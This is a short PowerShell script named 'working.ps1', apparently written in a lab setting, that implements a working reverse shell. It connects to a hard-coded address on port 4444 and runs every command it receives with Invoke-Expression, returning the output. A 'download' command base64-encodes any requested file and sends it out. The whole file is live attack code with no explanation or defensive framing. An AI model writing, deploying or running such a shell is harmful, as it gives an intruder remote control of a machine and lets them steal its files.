# working.ps1 - Minimal working version
$ip = "192.168.150.2"
$port = 4444

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

$writer.WriteLine("[+] Connected!")

while ($null -ne ($cmd = $reader.ReadLine())) {
    if ($cmd.StartsWith("download ")) {
        $path = $cmd.Substring(9)
        if (Test-Path $path) {
            $bytes = [System.IO.File]::ReadAllBytes($path)
            $b64 = [Convert]::ToBase64String($bytes)
            $writer.WriteLine("FILE_START")
            $writer.WriteLine($b64)
            $writer.WriteLine("FILE_END")
        } else {
            $writer.WriteLine("ERROR: File not found")
        }
    }
    else {
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            $writer.WriteLine($output)
        } catch {
            $writer.WriteLine("ERROR: $_")
        }
    }
}